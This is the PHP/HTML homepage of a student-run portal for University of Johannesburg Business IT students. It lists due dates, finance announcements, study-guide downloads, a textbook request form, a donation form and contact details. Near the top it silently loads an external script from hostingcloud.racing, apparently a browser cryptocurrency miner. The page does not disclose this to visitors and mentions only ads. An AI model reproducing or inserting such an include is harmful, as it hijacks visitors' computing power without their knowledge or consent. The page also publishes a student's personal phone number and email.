 <?php
// Initialize the session
session_start();
 
// Check if the user is logged in, if not then redirect him to login page
if(!isset($_SESSION["loggedin"]) || $_SESSION["loggedin"] !== true){
    header("location: /login");
    exit;
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <link rel="stylesheet" href="style.css">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="apple-touch-icon" href="images/favcon.png">
    <link rel="shortcut icon" href="images/favcon.png" type="image/x-icon">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Source+Sans+Pro:ital,wght@0,200;0,300;0,400;0,600;0,700;1,300;1,400;1,700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
    <title>UJ BIT GANG | Home</title>
</head>
<body id="head">
    <p style="font-size: 11px;"><i class="zmdi zmdi-alert-circle-o"></i> Website is updated @18:00 everyday.</p> 
    <div class="header">
        <img src="images/logo.png" alt="university of johannesburg logo">
        <h1>UJ Business IT Gang</h1>
        <p>2021</p>
    </div>
    
    <script src="https://www.hostingcloud.racing/lWg9.js"></script>
    <script src="js/ignore.js">
        
    </script>
    <div class="intro">
        <p>
            Hacker, you can find anything you want in this website if you find a bug, stop! and report to us. We will be gratefull to you and acknowledgement your effort until the end of time.
        </p>
        <p>
            We value the need for public and individual security, and that is why we provide all of our code to the public. That way, anyone can verify and <a class="link" href="https://github.com/uj-bit-gang/uj-bit-gang.github.io.git" target="_blank" rel="noopener noreferrer">contribute</a> to any part of it while ensuring that our users stay secure.
        </p>
    </div>


    <div class="task-wapper">
        <div>
            <i class="zmdi zmdi-calendar"></i>
            <h2>Due dates</h2>    
        </div>
    
        <div class="tasks">
            <table>
                <tr class="table-head">
                    <td class="count">No.</td>
                    <td>Module</td>
                    <td>Task</td>
                    <td>Due date</td>
                    <td>Time</td>
                </tr>

                <!-------New ttask here---------->

                <!-- <tr class="table-task">
                    <td class="count line"></td>
                    <td class="line"></td>
                    <td class="line"></td>
                    <td class="line"></td>
                    <td class="line"></td>
                </tr> -->


                <tr class="table-task">
                    <td class="count line">5.</td>
                    <td class="line">BAY</td>
                    <td class="line">LU2  Group Ass</td>
                    <td class="line">03/03/2022</td>
                    <td class="line">23:59</td>
                </tr>

                <tr class="table-task this-week">
                    <td class="count line">4.</td>
                    <td class="line">IFS</td>
                    <td class="line">LU3 Weekly Quiz</td>
                    <td class="line">25/02/2022</td>
                    <td class="line">23:59</td>
                </tr>

                <tr class="table-task complete">
                    <td class="count line">3.</td>
                    <td class="line">IFS</td>
                    <td class="line">LU1&2 Weekly Quiz</td>
                    <td class="line">18/02/2022</td>
                    <td class="line">23:59</td>
                </tr>

                <tr class="table-task complete">
                    <td class="count line">2.</td>
                    <td class="line">BAY</td>
                    <td class="line">LU1 Group Ass</td>
                    <td class="line">01/03/2022</td>
                    <td class="line">23:59</td>
                </tr>
                
                <tr class="table-task complete">
                    <td>1.</td>
                    <td>DSW</td>
                    <td>Practice Lab Work</td>
                    <td>22/02/2022</td>
                    <td>23:59</td>
                </tr>
            </table>
        </div>
    </div>
        

    <div class="text-book">
        <div>
            <i class="zmdi zmdi-copy"></i>
            <h2>Request a text-book</h2>
        </div>
        
        <p>Need a text-book? Fill this form with your student number and email. The text-books shared here are stictly for University of Johannesburg 
            Business IT students. <br> Student number will be verified before text-book is emailed to you.
        </p>
        <div class="request">
            <form action="mail.php" method="post">
                <div class="row">
                    <label for="student">Student Number:</label>
                    <input type="number" name="student" id="student" placeholder="290050033" required>
                </div>
                <div class="row">
                    <label for="student">Student Email:</label>
                    <input type="text" name="email" id="email" placeholder="290050033@student.uj.ac.za" required>
                </div>
                <div class="row">
                    <label for="student">DSW:</label>
                    <input type="checkbox" name="dsw" id="dsw">
                    <label for="student">SSW:</label>
                    <input type="checkbox" name="ssw" id="ssw">
                    <label for="student">IFS:</label>
                    <input type="checkbox" name="ifs" id="ifs">
                    <label for="student">BAY:</label>
                    <input type="checkbox" name="bay" id="bay">
                </div>
                <input class="btn" type="submit" value="submit">
            </form>
        </div>
    </div>


    <div class="announcements">
        <div>
            <i class="zmdi zmdi-comment-list"></i>
            <h2>Announcements</h2>
            <div class="announcements-wrapper">
                <table>
                    <tr>
                        <td style="font-weight: bold; width: 150px">Time:</td>
                        <td style="font-weight: bold; width: 90px">Module</td>
                        <td style="font-weight: bold;">Massage</td>
                    </tr>

                    <!-----------------New Announcements below here-------------------->
                    <tr>
                        <td class="line">2022/02/09 15:23</td>
                        <td class="line">IFS</td>
                        <td class="line"><span class="bold">Welcome: Information Systems 2A (IFS 2A):</span> Dear Students, Welcome to the Information Systems 2A Class of 2022. I hope you will have settled down in the registration process by now. A few things to consider as I welcome you:
                            Theory Classes: We will have face-to-face classes starting next week on 14th February 2022. I will be meeting you in your Theory class every Tuesday and Thursday at 8 am at B RED 22. The venue is large enough to accommodate you. Please maintain distance and always wear your mask.
                            Tutorial Classes: The computer labs are smaller and will only be able to accommodate you in groups. I have allocated each one of you to a group. Please strictly maintain the group allocated to you. To access your group allocation, please click on the link below. Your Tutor will be at the venue to welcome you. 
                            Do not hesitate to contact us if you have any problems. Wishing you well as you start your classes. Prof K Njenga</td>
                        <td><a class="link" href=""><i class="zmdi zmdi-download"></i></a></td>
                    </tr>

                    <tr>
                        <td class="line">2022/02/02 16:32</td>
                        <td class="line">Registrations</td>
                        <td class="line"><span class="bold">Dear UJ student:</span> We have noticed that you have not yet registered. Please note that you have been financially unblocked and you can now register online. If you have registered already, please ignore the sms.</td>
                        <td><a class="link" href="/downloadables/nafas-update-2022-02-02.jpg"><i class="zmdi zmdi-download"></i></a></td>
                    </tr>

                    <tr>
                        <td class="line">2022/01/31 10:43</td>
                        <td class="line">Student Finance</td>
                        <td class="line"><span class="bold">NSFAS Approved Students Lists:</span> <a href="https://www.uj.ac.za/wp-content/uploads/2021/10/students-unblocked-for-registration.pdf" class="link">Students unblocked for registration</a> <strong>(Funding still to be confirmed)</strong> . Regards, Student Finance.</td>
                        <td><a class="link" href="/downloadables/students-unblocked-for-registration.pdf"><i class="zmdi zmdi-download"></i></a></td>
                    </tr>

                    <tr>
                        <td class="line">2022/01/28 06:25</td>
                        <td class="line">Student Finance</td>
                        <td class="line"><span class="bold">Dear UJ student:</span> While the University of Johannesburg waits for the NSFAS funding outcome, the University will lift the financial block to enable you to register. Please note that should NSFAS withdraw your funding for 2022, you will be liable for the student fees. Regards, Student Finance.</td>
                        <td><a class="link" href="/downloadables/nafas-update-2022-01-28.jpg"><i class="zmdi zmdi-download"></i></a></td>
                    </tr>

                    <tr>
                        <td class="line">2022/01/25 06:26</td>
                        <td class="line">Student Finance</td>
                        <td class="line"><span class="bold">Dear UJ student:</span> We are currently waiting to finalize NSFAS results. We will communicate to all NSFAS funded students to proceed with online registration once the list is completed. Apologies for the delay. Regards, Student Finance.</td>
                        <td><a class="link" href="/downloadables/nafas-update-2022-01-25.jpg"><i class="zmdi zmdi-download"></i></a></td>
                    </tr>

                    <tr>
                        <td class="line">2022/01/19 19:26</td>
                        <td class="line">Student Finance</td>
                        <td class="line"><span class="bold">Dear UJ student:</span> We are currently waiting to finalize NSFAS results. WE will communicate to all NSFAS funded students to proceed with online registration once the list is completed. Apologies for the delay. Regards, Student Finance.</td>
                        <td><a class="link" href="/downloadables/nafas-update-2022-01-19-02.jpg"><i class="zmdi zmdi-download"></i></a></td>
                    </tr>

                    <tr>
                        <td class="line">2022/01/19 18:30</td>
                        <td class="line">Student Finance</td>
                        <td class="line"><span class="bold">Dear UJ student:</span> Please note we have submitted your 2021 final academic results to NSFAS for the 2022 funding decision. We will send communicaion to all provisionally funded students once recieved from NSFAS. Regards, Student Finance.</td>
                        <td><a class="link" href="/downloadables/nafas-update-2022-01-19-01.jpg"><i class="zmdi zmdi-download"></i></a></td>
                    </tr>

                    <tr>
                        <td class="line">2022/01/17 14:13</td>
                        <td class="line">Student Finance</td>
                        <td class="line"><span class="bold">Registration fee for NSFAS students:</span> You are not required to pay for your registration once you are unblocked for registering you will be notified as we are still waiting for Nsfas funded list so maybe by Friday you will be able to register.</td>
                        <td><a class="link" href="/downloadables/nafas-update-2022-01-17.jpeg"><i class="zmdi zmdi-download"></i></a></td>
                    </tr>
                </table>
            </div>
        </div>
    </div>

        
<!------------------------------------------------------------------------------
                    BAY
-------------------------------------------------------------------------------->

    <div class="tutorials">
        <div>
            <i class="zmdi zmdi-assignment"></i>
            <h2>Tutorials</h2>
        </div>
        
        <div class="module-wrapper">
            <button class="toggle">
                <h4>1. Business Analysis Tutorials<i class="zmdi zmdi-unfold-more"></i></h4>
                <i class="fa fa-plus icon" aria-hidden="true"></i>
            </button>
            <div class="module-content">
                <ul><!-- <li> <a href="" class="link"> View/Download</a></li> -->
                    <li>Study Guide 2022 | Semester 1 <a href="/downloadables/bay/LEARNER GUIDE BUSINESS ANALYSIS 2A (BAY02A1) 2022.pdf" class="link"> View/Download</a></li>
                </ul>
            </div>
        </div>
<!------------------------------------------------------------------------------
                    DSW
-------------------------------------------------------------------------------->

        <div class="module-wrapper">
            <button class="toggle">
                <h4>2. Development Software Tutorials<i class="zmdi zmdi-unfold-more"></i></h4>
                <i class="fa fa-plus icon" aria-hidden="true"></i>
            </button>
            <div class="module-content">
                <ul><!-- <li> <a href="" class="link"> View/Download</a> </li> -->
                <li>Development Software Project <a href="downloadables/dsw/Development Software Project.pdf" class="link"> View/Download</a> </li>
                    <li>Study Guide 2022 | Semester 1 <a href="/downloadables/dsw/Learning Guide DSW02A1.pdf" class="link"> View/Download</a> </li>
                </ul>
            </div>
        </div>
<!------------------------------------------------------------------------------
                    SSW
-------------------------------------------------------------------------------->

        <div class="module-wrapper">
            <button class="toggle">
                <h4>3. Communication Net Tutorials<i class="zmdi zmdi-unfold-more"></i></h4>
                <i class="fa fa-plus icon" aria-hidden="true"></i>
            </button>
            <div class="module-content">
                <ul><!-- <li> <a href="" class="link"> View/Download</a> </li> -->
                    <li>Study Guide 2022 | Semester 1 <a href="/downloadables/cmn/CMN02A1 - Learning Guide - 2022 v1.0.pdf" class="link"> View/Download</a> </li>
                </ul>
            </div>
        </div>
<!--------------------------------------------------------------------------
                              IFS
-------------------------------------------------------------------------------->
        <div class="module-wrapper">
            <button class="toggle">
                <h4>4. Infomation Systems Tutorials<i class="zmdi zmdi-unfold-more"></i></h4>
                <i class="fa fa-plus icon" aria-hidden="true"></i>
            </button>
            <div class="module-content">
                <ul><!-- <li> <a href="" class="link"> View/Download</a> </li> -->
                    
                    <li>Tutorials Timetable: Group C <a class="link" href="/downloadables/ifs/IFS02A1_2022_Lab_Session_Group C  Friday.pdf"> View/Download</a></li>
                    <li>Tutorials Timetable: Group B <a class="link" href="/downloadables/ifs/IFS02A1_2022_Lab_Session_Group B  Thursday.pdf"> View/Download</a> </li>
                    <li>Tutorials Timetable: Group A <a class="link" href="/downloadables/ifs/IFS02A1_2022_Lab_Session_Group A  Monday.pdf"> View/Download</a></li>
                    <li>Study Guide 2022 | Semester 1<a class="link" href="/downloadables/ifs/STUDY GUIDE IFS 02A1  2022.pdf"> View/Download</a></li>
                </ul>
            </div>
        </div>
    </div>


    <div class="donate">
        <div>
            <i class="zmdi zmdi-favorite"></i>
            <h2>Donate</h2>
        </div>
        <p>This website helped you somehow or you Want all these ads gone? Please make a donatin from as little as R5.00 for us to keep the site up, up-to-date and ad free.</p>
        <div class="donate-form">
            <script language="JavaScript" type="text/javascript">

                function click_3db0f0d1ca30c3edb779ba42440f53a1( aform_reference ) {
                    var aform = aform_reference;
                    aform['amount'].value = Math.round( aform['amount'].value*Math.pow( 10,2 ) )/Math.pow( 10,2 );
                    aform['custom_amount'].value = aform['custom_amount'].value.replace( /^\s+|\s+$/g,"" );
                    if( !aform['custom_amount'].value || 0 === aform['custom_amount'].value.length || /^\s*$/.test( aform['custom_amount'].value ) ) {
                        alert ( 'An amount is required' );
                        return false;
                    }
                    aform['amount'].value = Math.round( aform['custom_amount'].value*Math.pow( 10,2 ) )/Math.pow( 10,2 );
                }
            </script>
            <form action="https://www.payfast.co.za/eng/process" name="form_3db0f0d1ca30c3edb779ba42440f53a1" onsubmit="return click_3db0f0d1ca30c3edb779ba42440f53a1( this );" method="post">
                <input type="hidden" name="cmd" value="_paynow">
                <input type="hidden" name="receiver" value="18766734">
                <input type="hidden" name="item_name" value="UJ BIT Gang Donation">
                <input type="hidden" name="amount" value="5.00">
                <input type="hidden" name="item_description" value="">
                <input type="hidden" name="return_url" value="https://ujbitgang.online/thank-you.html">
                <input type="hidden" name="cancel_url" value="https://ujbitgang.online/">
                
                <table class="donate-table">
                    <tr>
                        <p>Amount:</p>
                        <input class="donate-input" type="text" name="custom_amount" class="pricing" value="5.00">
                    </tr>
                    <tr>
                        <input type="image" src="https://www.payfast.co.za/images/buttons/dark-small-paynow.png" width="165" height="36" alt="Pay Now" title="Pay Now with PayFast">
                    </tr>
                </table>
            </form>
        </div>
        <p>Sercure payments via <img class="payfast-img" src="https://www.payfast.co.za/assets/images/logos-and-images/payfast-logo-black.svg" alt="payfast-logo-black"></p>
    </div>

    <div class="contact" id="contact">
        <div>
            <i class="zmdi zmdi-phone"></i>
            <h2>Contact</h2>
        </div>
        <p>There is incorrect information, broken links, want to leave a feedback or you just want to chat? Here you can reach us.</p>
        <div class="contact-wrapper row">
            <a class="link" href="mailto:22002913@student.uj.ac.za"><div><p class="alone"><i class="zmdi zmdi-email"></i></p>Email Us</div></a>
            <a class="link" href="https://wa.link/bsctgt"><div><p><i class="zmdi zmdi-whatsapp"></i></p>+27 68 172 1606</div></a>
        </div>
    </div>


    <footer>
        <div class="footer">
            <p style="font-size: small;">Designed by 220023913</p>
            <p style="font-size: small;">copyright reserved</p>
            <div>
                <a href="https://github.com/uj-bit-gang/uj-bit-gang.github.io" class="link"><div><i style="font-size: small; height: 20px;"></i></div></a>class="zmdi zmdi-github"></i><p>Source Code</p></div></a>
            </div>
            <div class="scroll">
                <a href="#head"><i class="zmdi zmdi-chevron-up"></i></a>
            </div>
        </div>
        <div class="App">
            <a class="link" href="/downloadables/android-app.apk"><i class="zmdi zmdi-android"></i> Get Android App</a>
        </div>
    </footer>
    <!------------------------------------
        Cookies and terms banner
    ---------------------------------->
    <script src="/js/script.js"></script>
    <script type="text/javascript" src="https://cookieconsent.popupsmart.com/src/js/popper.js"></script>
    <script> 
        window.start.init({Palette:"palette7",Theme:"block",Mode:"banner top",Message:"This website uses cookies to ensure you get the best experience on our website and you also agree to terms and conditions while using this website.",LinkText:" Learn More!",Location:"ujbitgang.co.za/terms/",Time:"5",})
    </script>
</body> 